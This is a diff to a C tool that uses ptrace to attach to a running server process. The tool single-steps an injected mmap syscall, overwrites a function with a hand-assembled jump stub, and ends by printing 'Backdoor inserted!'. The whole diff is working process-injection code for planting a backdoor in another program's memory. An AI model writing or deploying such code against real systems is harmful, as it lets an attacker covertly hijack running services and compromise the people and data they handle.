@@ -102,6 +102,13 @@ void write_words_at(int server_pid, unsigned long long location, int count, unsi
     }
 }
 
+unsigned long long get_rax(int server_pid)
+{
+    struct user_regs_struct regs;
+    ptrace(PTRACE_GETREGS, server_pid, 0, &regs);
+    return regs.rax;
+}
+
 /**
  * Mmaps a new page to do whatever I want in. Executes the `syscall` instruction at `where`,
  * so that should be mapped and executable (`rip` for example)
@@ -135,7 +142,7 @@ unsigned long long mmap_me(int server_pid, unsigned long long where)
     write_words_at(server_pid, where, MMAP_CODE_LEN, mmap_code);
     ptrace(PTRACE_SETREGS, server_pid, 0, &call_regs);
 
-    for (int i = 0; i < MMAP_CODE_LEN; i++) {
+    for (int i = 0; i < MMAP_CODE_LEN || get_rax(server_pid) == 9; i++) {
         ptrace(PTRACE_SINGLESTEP, server_pid, 0, 0);
         waitpid(server_pid, 0, __WALL);
     }
@@ -173,8 +180,6 @@ void write_jump_code(int server_pid, unsigned long long func_location, unsigned 
     unsigned long jump_code[2];
     jump_code[0] = 0xb84850 | jump_location << (8 * 3);
     jump_code[1] = jump_location >> (8 * 5) | 0x894858e0ffull << (8 * 3);
-    printf("jump code 0 : %lx\n", htobe64(jump_code[0]));
-    printf("jump code 1 : %lx\n", htobe64(jump_code[1]));
 
     write_words_at(server_pid, func_location, 2, jump_code);
 }
@@ -268,6 +273,8 @@ int main(int argc, char *argv[])
     write_my_code(server_pid, mmap_location, func_location + 13);
 
     ptrace(PTRACE_CONT, server_pid, 0, 0);
+
+    printf("Backdoor inserted!\n");
 
     return 0;
 }
